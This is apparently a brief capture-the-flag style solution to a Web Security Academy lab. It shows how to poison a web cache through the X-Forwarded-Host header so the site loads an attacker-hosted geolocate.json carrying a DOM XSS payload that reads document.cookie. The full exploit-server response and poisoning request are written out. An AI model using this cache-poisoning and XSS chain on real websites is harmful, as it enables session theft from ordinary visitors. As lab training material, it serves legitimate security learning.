Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria

Solution provided is great. The whole trick is figuring out the vulnerability in the js file. Here's my exploit server:

File:
/resources/json/geolocate.json

Head:
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Access-Control-Allow-Origin: *

Body:
{
"country": "<img src=1 onerror=alert(document.cookie) />"
}

And the final request:

GET / HTTP/1.1
Host: acfd1f9d1f8ce4c0809c1e6000c40043.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
X-Forwarded-Host: ac931f6a1fe9e48180091ec201a500f9.web-security-academy.net
Referer: https://acfd1f9d1f8ce4c0809c1e6000c40043.web-security-academy.net/product?productId=1
Cookie: session=CciToS31VuhO5xXclZUCjOkKhNfUSQrS
Upgrade-Insecure-Requests: 1

